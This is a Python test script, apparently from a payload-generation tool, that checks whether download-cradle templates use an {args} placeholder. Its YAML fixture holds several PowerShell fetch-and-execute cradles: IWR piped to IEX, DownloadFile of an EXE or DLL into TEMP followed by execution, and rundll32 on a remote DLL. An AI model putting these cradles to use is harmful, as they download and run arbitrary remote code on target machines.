#!/usr/bin/env python3
"""
Test that args field detection works for all cradle types
"""
import yaml

print("="*70)
print("Testing Args Field Detection for Cradles")
print("="*70)

# Test YAML with different cradle types using both code and command
test_yaml = """
# PS1 cradle with code and {args}
- name: PS1 Cradle (code with args)
  type: cradle-ps1
  code: |
    IWR "{url}/{output_file}" {if args}| % {{$_.Content | iex; & {args}}}{fi} | IEX

# PS1 cradle with command and {args}
- name: PS1 Cradle (command with args)
  type: cradle-ps1
  command: |
    echo "IWR '{url}/{output_file}' {if args}-Args '{args}'{fi} | IEX"

# EXE cradle with code and {args}
- name: EXE Cradle (code with args)
  type: cradle-exe
  code: |
    (New-Object Net.WebClient).DownloadFile('{url}/{output_file}', '$env:TEMP\\file.exe');
    & '$env:TEMP\\file.exe' {if args}'{args}'{fi}

# EXE cradle with command and {args}
- name: EXE Cradle (command with args)
  type: cradle-exe
  command: |
    echo "(New-Object Net.WebClient).DownloadFile('{url}/{output_file}', '$$env:TEMP\\file.exe'); & '$$env:TEMP\\file.exe' {if args}'{args}'{fi}"

# DLL cradle with code and {args}
- name: DLL Cradle (code with args)
  type: cradle-dll
  code: |
    (New-Object Net.WebClient).DownloadFile('{url}/{output_file}', '$env:TEMP\\file.dll');
    rundll32 '$env:TEMP\\file.dll',{entry_point} {if args}{args}{fi}

# DLL cradle with command and {args}
- name: DLL Cradle (command with args)
  type: cradle-dll
  command: |
    echo "rundll32 '{url}/{output_file}',{entry_point} {if args}{args}{fi}"

# PS1 cradle WITHOUT args
- name: PS1 Cradle (no args)
  type: cradle-ps1
  code: |
    IWR "{url}/{output_file}" | IEX
"""

features = yaml.safe_load(test_yaml)

print(f"\nTesting {len(features)} cradles\n")
print("-"*70)

for feature in features:
    name = feature.get('name', 'Unknown')
    ftype = feature.get('type', 'unknown')
    
    # Simulate the backend logic
    code = feature.get('code', '')
    command = feature.get('command', '')
    content = code or command
    
    uses_args = '{args}' in content
    
    print(f"\n{name}:")
    print(f"  Type: {ftype}")
    print(f"  Has 'code': {'code' in feature}")
    print(f"  Has 'command': {'command' in feature}")
    print(f"  Uses {{args}}: {uses_args}")
    
    # Verify the fix works
    if '{args}' in code or '{args}' in command:
        if not uses_args:
            print("  ❌ FAILED: Should detect {args} usage!")
        else:
            print("  ✓ PASS: Correctly detects {args}")
    else:
        if uses_args:
            print("  ❌ FAILED: Should NOT detect {args} usage!")
        else:
            print("  ✓ PASS: Correctly detects no {args}")

print("\n" + "="*70)
print("Summary")
print("="*70)
print("""
✓ The fix checks BOTH 'code' and 'command' fields for {args} usage

Before fix:
  - Only checked 'code' field
  - Cradles with 'command' field wouldn't show args input

After fix:
  - Checks both 'code' and 'command' fields
  - content = code or command
  - uses_args = '{args}' in content
  
This ensures the GUI args input field appears for:
  - cradle-ps1 with {args}
  - cradle-exe with {args}
  - cradle-dll with {args}
  
Regardless of whether they use 'code' or 'command' field.
""")
